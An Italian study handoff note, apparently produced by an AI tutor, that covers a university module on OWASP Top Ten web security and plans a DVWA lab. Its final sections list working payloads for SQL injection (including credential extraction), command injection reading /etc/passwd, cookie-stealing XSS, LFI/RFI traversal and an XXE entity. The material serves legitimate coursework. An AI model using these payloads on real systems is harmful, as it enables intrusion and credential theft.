# Security S3 — Web Security OWASP Top Ten: lezione + appunti

**Date:** 2026-06-24
**Status:** IN CORSO (lab VM non eseguito)
**Corso:** Lab Sicurezza Informatica T
**Capitolo/Modulo:** S3 — Web Security (OWASP Top Ten 2021)
**Chain:** `standalone-972162f3` seq `7`
**Parent:** `HANDOFF_auto-precompact_2026-06-24_115651.md` (auto-precompact prima della compattazione)
**Prior chain:** security-s1-setup (seq 1) > security-s1-guida-lab (seq ~3) > security-s2-lezione (seq 3) > security-s2-appunti (seq 4) > sysadm-audit (seq 5) > security-s3-web-security (seq 6-7, questa sessione)

---

## Obiettivo della Sessione

Completare S3 Web Security: prima il blocco teorico (lezione + appunti) da leggere prima di pranzo, poi il lab su DVWA nel pomeriggio. La sessione è partita con una riflessione strategica sulla fattibilità del doppio esame (Security 17/07 + SysAdmin 15/07), poi ha prodotto lezione e appunti completi di S3. Il lab su VM non è stato eseguito — è il prossimo step.

**Decisione strategica presa**: Lorenzo ha scelto **Opzione C** — continuare entrambi gli esami, checkpoint il 30/06. Target checkpoint: essere su S4 e 3E avviato.

---

## Concetti Assimilati

- **Threat model unificante**: l'applicazione web non distingue tra *dato* e *istruzione* — quasi tutto OWASP nasce da questo. Principio difensivo: *validate input, escape output*.
- **A1 IDOR**: cambio di parametro URL (`?id=42` → `?id=43`) senza verifica autorizzazione. File Disclosure è IDOR applicato a file: `?page=../../../../etc/passwd`. LFI = include file locale (ed esegue se PHP); RFI = include file remoto → RCE.
- **A2 Cryptographic Failures**: MD5 per password non basta — manca salt e key stretching, craccabile con rainbow table. Hash di "password" = `5f4dcc3b5aa765d61d8327deb882cf99` (esempio visibile su DVWA).
- **A3 SQL Injection semplice**: `' OR 'a'='a` → la query diventa `WHERE ID='' OR 'a'='a'` — la seconda condizione è always-true, restituisce tutti i record.
- **A3 SQLi Union Based**: UNION concatena risultati di due SELECT (stesso numero colonne). NULL progressivi scopre il numero di colonne. `information_schema` (DB speciale MySQL) mappa struttura completa: `schemata` → `tables` → `columns` → poi SELECT sui dati reali. `#` finale commenta il resto della query originale.
- **A3 Command Injection**: `;` esegue il secondo comando sempre; `&&` solo se il primo ha exit code 0. Per l'attaccante `;` è più affidabile. È RCE con privilegi www-data.
- **A3 XSS**: colpisce il motore JavaScript del browser della vittima, non il server. Payload `<script>alert("XSS")</script>`. Reflected = nell'URL echoed; Stored = persiste nel DB (più pericoloso — colpisce automaticamente tutti i visitatori); DOM-based = solo client-side, non passa dal server (WAF server-side non lo vede).
- **A5 HTTP Security Headers**: istruzioni che il server manda al browser — `X-Frame-Options` (anti-clickjacking), `CSP: default-src 'self'` (blocca script esterni, mitiga XSS), `HSTS` (forza HTTPS), `X-Content-Type-Options: nosniff` (anti MIME-sniffing).
- **A5 SOP/CORS**: SOP = il browser blocca script di dominio A dall'accedere a risorse di dominio B. CORS = eccezione controllata tramite header `Access-Control-Allow-Origin`. CORS `*` + credenziali = vulnerabilità.
- **A5 XXE**: XML con `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` — il parser de-referenzia `&xxe;` leggendo il file e inserendolo nella risposta. SYSTEM con URI HTTP → SSRF via parser. Billion Laughs = DoS da entità annidate.
- **A7 Session Fixation**: attaccante ottiene token pre-auth, vittima si autentica su quello stesso token → attaccante impersona la vittima.
- **A7 CSRF**: browser include automaticamente i cookie di sessione in ogni richiesta verso il dominio, anche se generata da un sito terzo. Mitigazione: CSRF token nascosto nel form. CSRF sfrutta *autenticazione* già presente, non autorizzazione (distinzione critica esame).
- **A10 SSRF**: server fa richieste HTTP verso URL fornito dall'utente senza validare → attaccante usa il server come proxy verso rete interna (router, DB, AWS metadata service `169.254.169.254`).

---

## Ancora Poco Chiaro

- Lorenzo non aveva concetti rimasti irrisolti dopo gli appunti — tutte le 16 domande esplicite sono state risolte inline.
- **Da verificare sul campo**: l'esecuzione pratica di SQLi Union Based (NULL progressivi → information_schema → estrazione) su DVWA — comprensione teorica presente, pratica assente. Il lab è il test reale.
- La distinzione `;` vs `&&` in command injection è stata capita teoricamente — da ancorare sulla VM.

---

## Connessioni con Altro

- **S1 → S3**: gobuster e nmap usati in S1 sono il primo step del lab S3 (enumeration di DVWA prima degli exploit).
- **S2 → A7**: session fixation + CSRF sono il rovescio degli argomenti di S2 (autenticazione corretta). CSRF ribalta la confusione auth/authz che Lorenzo aveva in S2 con FIDO.
- **S5 iptables → SSRF**: regole firewall in uscita dal server mitigano SSRF bloccando le connessioni verso `169.254.169.254` e reti interne.
- **S10 Suricata → A9**: Suricata rileva pattern di SQLi, XSS, path traversal nel traffico — il logging di A9 diventa operativo con Suricata.

---

## Esercizi

| Esercizio | Stato | Approccio usato | Note |
|---|---|---|---|
| /lezione S3 | ✓ | Lettura integrale PDF teoria (45pp) + lab (42pp) → lezione | Tutti e 10 gli item OWASP coperti con threat model dual |
| /appunti S3 | ✓ | 16 domande grezze risolte inline | Lapsus "login" vs "logging" in A9 corretto |
| /lab S3 (DVWA) | ⬜ | — | Da eseguire nel pomeriggio / prossima sessione |

---

## Errori e Misconcezioni

- **Lapsus A9**: negli appunti grezzi Lorenzo ha scritto "sistema di **login** sufficentemente sicuro" invece di "**logging**" — corretto negli appunti definitivi. Login = autenticazione; logging = registrazione eventi. Non segnalato come pattern ricorrente (singolo lapsus).
- **Nessun errore concettuale grave**: Lorenzo ha sintetizzato bene il threat model iniziale e ha inquadrato correttamente IDOR, session fixation, e la catena Union Based prima di leggerla.

---

## Materiali Usati

### PDF (letti integralmente)
- `UniCode/SLIDE TEORIA/SICINF/Web_security_6_marzo.pdf` — pagine 1-45 (OWASP A1-A10)
- `UniCode/SLIDE LAB/SICINF/LAB_web_security_11_marzo.pdf` — pagine 1-42 (DVWA, SQLi, XSS, Command Injection, LFI/RFI, brute force)

### File creati questa sessione
- `UniCode/claudeLezioni/LEZIONI SECURITY/lezione_moduloS3_web_security.md` — lezione completa
- `UniCode/claudeLezioni_PDF/LEZIONI SECURITY/lezione_moduloS3_web_security.pdf` — 77KB
- `UniCode/claudeAppunti/APPUNTI SECURITY/appunti_moduloS3_web_security.md` — 16 risposte inline
- `UniCode/claudeAppunti_PDF/APPUNTI SECURITY/appunti_moduloS3_web_security.pdf`
- `UniCode/stato/log_sessioni.md` — aggiunta voce sessione 40
- `UniCode/stato/tracker_ripasso.md` — aggiunto S2 (mancava)

### Commits pushati
```
b9a4ba4 session: security-s3-web-security [standalone-972162f3 seq 6]
2b687c9 pdf: lezione_moduloS3_web_security 2026-06-24
c6a7140 feat(S3): lezione web security OWASP Top Ten 2021
```

---

## Preferenze e Feedback di Sessione

- Lorenzo ha confermato il formato lezione (prosa discorsiva ancorata ai comandi, threat model dual) — nessuna correzione richiesta.
- Ha richiesto esplicitamente PDF prima del push su GitHub — ricordare `/pdf-batch` (o generazione manuale con pandoc) come step obbligatorio prima di qualsiasi push di materiali studio.
- Checkpoint 30/06 accettato come go/no-go per doppio esame: target S4 completato + 3E avviato.

---

## Dove Stiamo Andando

1. **Prossimo immediato**: `/lab S3` → genera `guida_lab_moduloS3_web_security.md` → eseguire su VM Parrot con DVWA
2. **Ripasso S1**: scaduto il 25/06 (ieri) — 15-20 min prima di attaccare il lab
3. **Ripasso S2**: scade il 26/06 — fare domani
4. **Entro fine giugno**: S4 Binary Exploits (il più difficile del programma)
5. **Checkpoint 30/06**: verificare stato — essere su S4 avviato + SysAdmin 3E avviato

---

## Rischi e Blocchi

- **Lab S3 non eseguito**: S3 è tipologia d'esame ⭐. La comprensione teorica è presente ma il ✅ richiede esecuzione pratica su DVWA. Senza il lab il modulo non è consolidato per l'esame pratico.
- **Ripasso S1 scaduto**: era fissato al 25/06 — non fatto. Da inserire come prima azione della prossima sessione (15-20 min).
- **S4 Binary Exploits** (buffer overflow x86_32): il PDF del lab è molto più tecnico di S3. Stimato ~12h. Va iniziato prima possibile per avere tempo di sedimentazione.
- **IP degli esempi**: pattern ricorrente da errori_frequenti.md — verificare sempre con `ip a` prima di usare qualsiasi IP nell'attività lab. Gli IP del PDF (.32/.33/.34) sono esempi, non i tuoi.

---

## Payload chiave da ricordare per il lab

**SQL Injection Union Based** (sequenza completa su DVWA):
```
Scopri colonne:  ' union select NULL,NULL #       → 2 colonne
Versione DB:     ' union select NULL,@@version #
DB corrente:     ' union select NULL,database() #
Lista schemi:    ' union select null,schema_name from information_schema.schemata #
Tabelle dvwa:    ' union select null,table_name from information_schema.tables where table_schema='dvwa' #
Colonne users:   ' union select null,column_name from information_schema.columns where table_name='users' #
Estrai creds:    ' union select user,password from users #
```
`#` commenta il resto della query originale (il `'` di chiusura che c'è nel codice PHP).

**Command Injection** (form ping DVWA):
```
127.0.0.1; ls          → ; esegue sempre
127.0.0.1 && ls        → && esegue solo se ping ok
; cat /etc/passwd      → legge utenti di sistema
; id                   → mostra i privilegi del webserver
```

**XSS** (tab XSS Reflected e Stored su DVWA):
```
<script>alert("XSS")</script>      → prova di concetto
<script>alert(document.cookie)</script>   → mostra cookie di sessione
```

**LFI / Path Traversal** (tab File Inclusion):
```
?page=../../../../etc/passwd            → LFI
?page=http://IP_PARROT:8081/test.php    → RFI (va abilitato manualmente)
```

## Setup lab S3 (prerequisiti VM)

```bash
# VM Parrot — avvia DVWA
./pentestlab.sh start dvwa

# Verifica che il container sia up e trova l'IP
ip a                          # ← il tuo IP host, NON quelli del PDF
docker ps                     # controlla che dvwa sia running
# Accesso: http://dvwa (o http://IP_CONTAINER)
# Login: admin / password
# Imposta difficulty: low (DVWA Security → Submit)
```

⚠️ Ricorda: gli IP nei PDF del corso (.32/.33/.34) sono esempi dell'anno scorso. Verifica sempre con `ip a` + `nmap -sn` la tua rete attuale.

## Quick Start Prossima Sessione

```
# Ripristina contesto
Leggi: .claude/handoffs/HANDOFF_standalone-972162f3_security-s3-web-security_2026-06-24.md

# Stato moduli
S1 ✅ (ripasso SCADUTO — fare prima) | S2 ✅ (ripasso 26/06) | S3 🔄 (lab mancante)

# Prima azione — Ripasso S1 (15 min)
/ripassa S1

# Seconda azione — Lab S3
/lab S3
# poi: ./pentestlab.sh start dvwa (su VM Parrot)
# poi: ip a  ← verifica il tuo IP, NON usare quelli del PDF

# Verifica comprensione prima di proseguire al lab
Senza guardare gli appunti: spiega la catena Union Based in 4 passi
(NULL progressivi → schema → tabelle → dati). Se non riesci, rileggi la sezione prima della VM.
```
